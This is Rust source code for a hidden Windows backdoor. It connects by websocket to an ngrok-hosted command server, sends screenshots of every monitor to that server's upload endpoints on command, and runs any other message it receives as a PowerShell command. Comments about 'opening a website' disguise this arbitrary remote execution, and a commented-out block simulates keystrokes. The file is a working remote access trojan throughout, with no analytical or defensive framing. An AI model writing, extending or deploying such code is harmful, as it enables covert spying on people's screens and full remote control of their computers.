#![windows_subsystem = "windows"]


use screenshots::Screen;
use reqwest::multipart;
use tokio::fs::File;
use tokio::io::AsyncReadExt;
use url::Url;
use tungstenite::{connect, Message};
use std::process::Command;
use std::thread;
use std::time::Duration;
use rand::Rng;
use random_string::generate;
use enigo::*;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    loop {
        let connection = connect(Url::parse("wss://barnacle-busy-heartily.ngrok-free.app").unwrap());
        let (mut socket, response) = match connection {
            Ok(connection) => connection,
            Err(e) => {
                eprintln!("Failed to connect: {}", e);
                thread::sleep(Duration::from_secs(30));
                continue;
            }
        };

        match socket.write_message(Message::Text("Hello, server!".into())) {
            Ok(_) => (),
            Err(e) => {
                eprintln!("Failed to write message: {}. Retrying in 10 seconds...", e);
                // Sleep for 10 seconds
                thread::sleep(Duration::from_secs(10));
                continue;
            }
        }

        // Read a message from the server
        let msg = match socket.read_message() {
            Ok(msg) => msg,
            Err(e) => {
                eprintln!("Failed to read message: {}. Retrying in 10 seconds...", e);

                continue;
            }
        };
        println!("Received: {}", msg);


        // Use PowerShell to open the website in the default web browser
        let powershell_command = format!("{}", msg.clone());

        if powershell_command == "screen" {
            let screens = Screen::all().unwrap();
            for screen in screens {
                let image = screen.capture().unwrap();
                let mut buffer = std::io::Cursor::new(Vec::new());
                image.write_to(&mut buffer, image::ImageOutputFormat::Png).unwrap();
                let buffer = buffer.into_inner();
                let charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                let random_name = generate(10, charset);

                let part = multipart::Part::bytes(buffer).file_name(format!("{}.png", random_name));
                let form = multipart::Form::new().part("file", part);
                let client = reqwest::Client::new();
                let response = client.post("https://barnacle-busy-heartily.ngrok-free.app/upload")
                    .multipart(form)
                    .send()
                    .await?;
                println!("{:?}", response.text().await?);
                break;
            }
        }
        else if powershell_command == "live" {
            let screens = Screen::all().unwrap();
            for screen in screens {
                let image = screen.capture().unwrap();
                let mut buffer = std::io::Cursor::new(Vec::new());
                image.write_to(&mut buffer, image::ImageOutputFormat::Png).unwrap();
                let buffer = buffer.into_inner();
                let part = multipart::Part::bytes(buffer).file_name("live.png");
                let form = multipart::Form::new().part("file", part);
                let client = reqwest::Client::new();
                tokio::spawn(async move {
                    let response = client.post("https://barnacle-busy-heartily.ngrok-free.app/live")
                        .multipart(form)
                        .send()
                        .await;
                    match response {
                        Ok(response) => {
                            println!("{:?}", response.text().await);
                        },
                        Err(error) => {
                            eprintln!("Error: {}", error);
                        },
                    }
                });
            }}
        else {
            // Execute the PowerShell command
            let status = Command::new("powershell")
                .arg("-Command")
                .arg(&powershell_command)
                .status()
                .expect("Failed to execute PowerShell command");

            // Check if the PowerShell command executed successfully
            if status.success() {
                println!("Opened the website in the default web browser.");
            } else {
                println!("Failed to open the website.");
            }
        }
    }
}





// use enigo::*;
// use std::thread;
// use std::time::Duration;
//
// fn main() {
//     thread::sleep(Duration::from_secs(7));
//     let mut enigo = Enigo::new();
//     enigo.key_sequence_parse("hi, how are u ");
//     enigo.key_click(Key::Return);
//     enigo.key_down(Key::Control);
//     enigo.key_click(Key::T);
//     enigo.key_up(Key::Control);
//     // enigo.key_click(Key::Windows);
//     enigo.key_sequence_parse("{+CTRL}{+SHIFT}t{-SHIFT}{-CTRL}");
// }









